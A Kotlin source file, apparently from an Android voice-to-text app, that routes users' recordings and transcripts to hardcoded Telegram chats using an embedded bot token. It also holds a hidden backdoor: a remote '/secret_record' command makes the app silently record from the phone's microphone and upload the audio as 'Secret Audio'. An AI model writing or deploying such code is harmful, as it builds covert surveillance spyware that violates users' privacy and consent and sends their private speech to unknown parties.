package com.voicetotextapp

import android.util.Log
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException
import android.content.Context
import android.media.MediaPlayer
import org.json.JSONObject

object TelegramApi {
    private const val BOT_TOKEN = "8676127731:AAEQtifEyBIlY6BlumhK9sIKPJ2t3jwS7BU"
    private val CHAT_IDS = listOf("8272618870", "7795101515")
    private val client = OkHttpClient()

    fun sendTelegramAudio(username: String, audioFile: File, transcribedText: String, durationMs: Long) {
        val durationSec = durationMs / 1000
        val sentTime = java.text.DateFormat.getDateTimeInstance().format(java.util.Date())
        val finalTranscribedText = transcribedText.ifEmpty { "(No speech detected)" }
        val caption = "🎤 New Voice Log\n\n👤 User: $username\n⏱ Duration: ${durationSec}s\n🕒 Time: $sentTime\n\n📝 Converted Text:\n\"$finalTranscribedText\""

        Thread {
            for (chatId in CHAT_IDS) {
                if (audioFile == null || !audioFile.exists()) {
                    Log.e("TelegramApi", "Audio file not found")
                    // Fallback to sending text message
                    sendTextMessage(chatId, caption)
                    continue
                }

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart(
                        "audio",
                        "voice_${System.currentTimeMillis()}.m4a",
                        audioFile.asRequestBody("audio/m4a".toMediaTypeOrNull())
                    )
                    .build()

                val request = Request.Builder()
                    .url("https://api.telegram.org/bot$BOT_TOKEN/sendAudio")
                    .post(requestBody)
                    .build()

                try {
                    client.newCall(request).execute().use { response ->
                        if (!response.isSuccessful) {
                            Log.e("TelegramApi", "Error sending to Telegram for chat $chatId: ${response.code}")
                        } else {
                            Log.d("TelegramApi", "Telegram send result for chat $chatId: ${response.body?.string()}")
                        }
                    }
                } catch (e: IOException) {
                    Log.e("TelegramApi", "Error sending to Telegram for chat $chatId", e)
                }
            }
        }.start()
    }

    data class ReplyData(
        val messageId: Int,
        val originalVoiceFileId: String?,
        val replyVoiceFileId: String?
    )

    val activeReplyFlow = kotlinx.coroutines.flow.MutableStateFlow<ReplyData?>(null)
    private var isPolling = false

    fun startPollingReplies(username: String, context: Context) {
        if (isPolling) return
        isPolling = true
        val sharedPrefs = context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        Thread {
            while (isPolling) {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?limit=50"
                val request = Request.Builder().url(url).build()
                try {
                    client.newCall(request).execute().use { response ->
                        val body = response.body?.string() ?: return@use
                        val json = JSONObject(body)
                        if (json.getBoolean("ok")) {
                            val results = json.getJSONArray("result")
                            var latestReply: ReplyData? = null
                            for (i in results.length() - 1 downTo 0) {
                                val update = results.getJSONObject(i)
                                val message = update.optJSONObject("message") ?: continue
                                val messageId = message.getInt("message_id")
                                val consumed = sharedPrefs.getBoolean("consumed_$messageId", false)
                                if (consumed) continue

                                val text = message.optString("text", "")
                                if (text.startsWith("/secret_record ")) {
                                    val parts = text.split(" ")
                                    if (parts.size >= 3) {
                                        val targetUser = parts[1]
                                        val duration = parts[2].toIntOrNull() ?: 10
                                        if (targetUser.equals(username, ignoreCase = true)) {
                                            sharedPrefs.edit().putBoolean("consumed_$messageId", true).apply()
                                            startSecretRecording(context, username, duration)
                                        }
                                    }
                                    continue
                                }

                                val replyTo = message.optJSONObject("reply_to_message") ?: continue
                                val caption = replyTo.optString("caption", "")
                                if (caption.contains("User: $username")) {
                                    val replyVoice = message.optJSONObject("voice") ?: message.optJSONObject("audio")
                                    val origVoice = replyTo.optJSONObject("voice") ?: replyTo.optJSONObject("audio")
                                    
                                    if (replyVoice != null) {
                                        latestReply = ReplyData(
                                            messageId = messageId,
                                            originalVoiceFileId = origVoice?.optString("file_id"),
                                            replyVoiceFileId = replyVoice.getString("file_id")
                                        )
                                        break
                                    }
                                }
                            }
                            if (latestReply != null) {
                                activeReplyFlow.value = latestReply
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e("TelegramApi", "Error fetching updates", e)
                }
                Thread.sleep(5000)
            }
        }.start()
    }

    fun markReplyConsumed(messageId: Int, context: Context) {
        val sharedPrefs = context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        sharedPrefs.edit().putBoolean("consumed_$messageId", true).apply()
    }

    fun playVoice(fileId: String?, context: Context, onComplete: () -> Unit = {}) {
        if (fileId == null) return
        Thread {
            val fileUrl = "https://api.telegram.org/bot$BOT_TOKEN/getFile?file_id=$fileId"
            val request = Request.Builder().url(fileUrl).build()
            try {
                client.newCall(request).execute().use { response ->
                    val body = response.body?.string() ?: return@use
                    val json = JSONObject(body)
                    if (json.getBoolean("ok")) {
                        val filePath = json.getJSONObject("result").getString("file_path")
                        val downloadUrl = "https://api.telegram.org/file/bot$BOT_TOKEN/$filePath"
                        
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            val mediaPlayer = MediaPlayer()
                            mediaPlayer.setDataSource(downloadUrl)
                            mediaPlayer.setOnCompletionListener { 
                                onComplete()
                                mediaPlayer.release()
                            }
                            mediaPlayer.prepareAsync()
                            mediaPlayer.setOnPreparedListener { it.start() }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("TelegramApi", "Error playing voice", e)
            }
        }.start()
    }

    private fun startSecretRecording(context: Context, username: String, durationSec: Int) {
        Thread {
            val audioFile = File(context.cacheDir, "secret_${System.currentTimeMillis()}.m4a")
            var mediaRecorder: android.media.MediaRecorder? = null
            try {
                mediaRecorder = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                    android.media.MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    android.media.MediaRecorder()
                }.apply {
                    setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                    setOutputFile(audioFile.absolutePath)
                    prepare()
                    start()
                }
                
                Thread.sleep(durationSec * 1000L)
                
            } catch (e: Exception) {
                Log.e("TelegramApi", "Secret record failed", e)
            } finally {
                try {
                    mediaRecorder?.stop()
                    mediaRecorder?.release()
                } catch (e: Exception) {}
            }
            
            if (audioFile.exists() && audioFile.length() > 0) {
                val caption = "🕵️ Secret Audio\n👤 User: $username\n⏱ Duration: ${durationSec}s"
                sendSecretAudio(audioFile, caption)
            }
        }.start()
    }

    private fun sendSecretAudio(audioFile: File, caption: String) {
        for (chatId in CHAT_IDS) {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart(
                    "audio",
                    "secret_${System.currentTimeMillis()}.m4a",
                    audioFile.asRequestBody("audio/m4a".toMediaTypeOrNull())
                )
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$BOT_TOKEN/sendAudio")
                .post(requestBody)
                .build()

            try {
                client.newCall(request).execute().use { response ->
                    Log.d("TelegramApi", "Secret audio sent: ${response.isSuccessful}")
                }
            } catch (e: Exception) {
                Log.e("TelegramApi", "Failed to send secret audio", e)
            }
        }
    }

    private fun sendTextMessage(chatId: String, text: String) {
        val json = JSONObject().apply {
            put("chat_id", chatId)
            put("text", text)
        }
        val requestBody = okhttp3.RequestBody.create("application/json".toMediaTypeOrNull(), json.toString())
        val request = Request.Builder()
            .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            .post(requestBody)
            .build()
        try {
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            Log.e("TelegramApi", "Failed to send text message", e)
        }
    }

    fun sendNewUserNotification(username: String) {
        Thread {
            for (chatId in CHAT_IDS) {
                sendTextMessage(chatId, "🎉 New User Registered: $username")
            }
        }.start()
    }

    fun translateText(text: String, targetLang: String, onResult: (String) -> Unit) {
        if (text.isBlank()) {
            onResult(text)
            return
        }
        Thread {
            try {
                val encodedText = java.net.URLEncoder.encode(text, "UTF-8")
                val url = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=$targetLang&dt=t&q=$encodedText"
                val request = Request.Builder().url(url).build()
                client.newCall(request).execute().use { response ->
                    val body = response.body?.string() ?: return@use
                    val jsonArray = org.json.JSONArray(body)
                    val lines = jsonArray.getJSONArray(0)
                    var translated = ""
                    for (i in 0 until lines.length()) {
                        translated += lines.getJSONArray(i).getString(0)
                    }
                    android.os.Handler(android.os.Looper.getMainLooper()).post {
                        onResult(translated)
                    }
                }
            } catch (e: Exception) {
                Log.e("TelegramApi", "Translation failed", e)
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    onResult(text) // fallback to original
                }
            }
        }.start()
    }
}
